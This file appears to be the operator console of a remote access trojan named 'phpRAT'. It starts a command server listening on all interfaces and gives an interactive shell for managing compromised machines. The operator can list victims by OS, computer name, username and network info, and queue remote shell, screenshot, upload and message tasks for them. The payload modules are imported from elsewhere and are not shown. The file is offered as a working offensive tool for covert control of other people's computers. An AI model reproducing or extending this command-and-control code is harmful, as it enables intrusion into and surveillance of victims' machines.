import logging
import threading
import cmd
from tabulate import tabulate
from datetime import datetime
import re
from tabulate import tabulate
import sys
import time
from os import system, name
from pyfiglet import Figlet
import random
from modules import *


class CLI(cmd.Cmd):

    intro = 'Welcome to phpRAT, use ? to see the commands\n'
    prompt = '(phpRAT) '
    modules = ['msg', 'shell', 'screenshot', 'upload']
    module = None


    def get_curr_module(self):
        return re.search('\((.+?)\) ', self.prompt).group(1)

    def do_exit(self, args):
        '''Exit the program'''
        print("Exitting, Thanks for trying!")
        raise SystemExit

    def do_show(self, args):
        '''use `show item` to show items such as machines, queue etc.'''
        if len(args) == 0:
            print("Use help!")
            return
        if 'machines' in args:
            print('Showing machines')
            lock.acquire(True)
            db.c.execute('SELECT * FROM machines')
            machines = []
            for i in db.c.fetchall():
                k = list(i)
                if k[5]:
                    k[5] = k[5][:14]
                k[1] = datetime.fromtimestamp(int(k[1]))
                machines.append(k)
            print(tabulate(machines, headers=[
                "MachineID", "LastConnected", "OS", "Computer Name", "Username", "Network Info", "CPU", "RAM"]))
            lock.release()
        elif 'queue' in args:
            if self.module:
                if self.module.machine_id:
                    print(f"Showing Queue of {self.module.machine_id}:")
                    print("===== Complete Tasks =====")
                    lock.acquire(True)
                    db.c.execute(
                        'SELECT * FROM queue WHERE machineId=? AND isComplete="true"', (self.module.machine_id, ))
                    print(tabulate(db.c.fetchall()))
                    print("===== Pending Tasks =====")
                    db.c.execute(
                        'SELECT * FROM queue WHERE machineId=? AND isComplete="false"', (self.module.machine_id, ))
                    print(tabulate(db.c.fetchall()))
                    lock.release()
            else:
                print(f"Showing Queue:")
                print("===== Complete Tasks =====")
                lock.acquire(True)
                db.c.execute(
                    'SELECT * FROM queue WHERE isComplete="true"')
                print(tabulate(db.c.fetchall()))
                print("===== Pending Tasks =====")
                db.c.execute(
                    'SELECT * FROM queue WHERE isComplete="false"')
                print(tabulate(db.c.fetchall()))
                lock.release()
        elif 'options' in args:
            print()
            print(tabulate(self.module.options, headers=[
                    "Option", "Value", "Required"]), end='\n\n')
        else:
            print("Use help!")

    def do_set(self, args):
        '''Set Value of Item'''
        args = args.split(' ')
        if len(args) < 2:
            print("Use help!")
        if self.module:
            if hasattr(self.module, args[0]):
                setattr(self.module, args[0], ' '.join(args[1:]))
            else:
                print("Use help!")
        else:
                print("Use help!")

    def do_unset(self, args):
        '''Unset Value of Item'''
        if len(args) == 0:
            print("Use help!")
            return
        option = args.strip()
        if option in dir(self.module):
            setattr(self.module, option, None)

    def do_use(self, args):
        if len(args) == 0:
            print("Use help!")
            return
        module = args.strip()
        if module in self.modules:
            self.prompt = f"({module}) "
            self.module = globals()[module]()

    def do_execute(self, args):
        if all(option[1] for option in self.module.options if option[2]=='True'):
            vals = [option[1] for option in self.module.options if option[0]!='machine_id']
            task_id = queue.insert(
                self.module.name, self.module.machine_id, args=vals)
            print(f"Added Task {task_id}")
        else:
            print("Check Options!")

    def complete_show(self, text, line, begidx, endidx):
        args_len = 2
        completions = ['machines', 'queue']
        if self.get_curr_module() in self.modules:
            completions.append('options')

        if len(line.split(' ')) > args_len:
            return []

        mline = line.split(' ')[-1]
        offs = len(mline) - len(text)
        return [s[offs:] for s in completions if s.startswith(mline)]

    def complete_set(self, text, line, begidx, endidx):
        args_len = 3
        completions = [option[0] for option in self.module.options]
        if 'machine_id' in line:
            lock.acquire(True)
            db.c.execute('SELECT machineId FROM machines')
            completions = [i[0] for i in db.c.fetchall()]
            lock.release()
        if len(line.split(' ')) > args_len:
            return []
        mline = line.split(' ')[-1]
        offs = len(mline) - len(text)
        return [s[offs:] for s in completions if s.startswith(mline)]

    def complete_unset(self, text, line, begidx, endidx):
        args_len = 2
        completions = [option[0] for option in self.module.options if option[1]]
        if len(line.split(' ')) > args_len:
            return []
        mline = line.split(' ')[-1]
        offs = len(mline) - len(text)
        return [s[offs:] for s in completions if s.startswith(mline)]

    def complete_use(self, text, line, begidx, endidx):
        args_len = 2
        completions = self.modules
        if len(line.split(' ')) > args_len:
            return []
        mline = line.split(' ')[-1]
        offs = len(mline) - len(text)
        return [s[offs:] for s in completions if s.startswith(mline)]

    def completenames(self, text, *ignored):
        dotext = 'do_'+text
        commands = [a[3:] for a in self.get_names() if a.startswith(dotext)]
        use_commands = ['set', 'unset', 'execute']
        if self.get_curr_module() not in self.modules:
            commands = [
                command for command in commands if command not in use_commands]
        return commands[::-1]

    def emptyline(self):
        pass


if __name__ == "__main__":
    sys.path.insert(0, "./server")
    from baburao import app, queue, db, lock
    baburao_thread = threading.Thread(
        target=app.run, kwargs={'host': '0.0.0.0'}, daemon=True)
    baburao_thread.start()
    time.sleep(1)
    system('cls' if name == 'nt' else 'clear')
    fonts_list = ['basic', 'big', 'chunky', 'slant', 'epic', 'standard']
    font = random.choice(fonts_list)
    f = Figlet(font=font)
    print(f.renderText('phpRAT'))
    cli = CLI()
    cli.cmdloop()
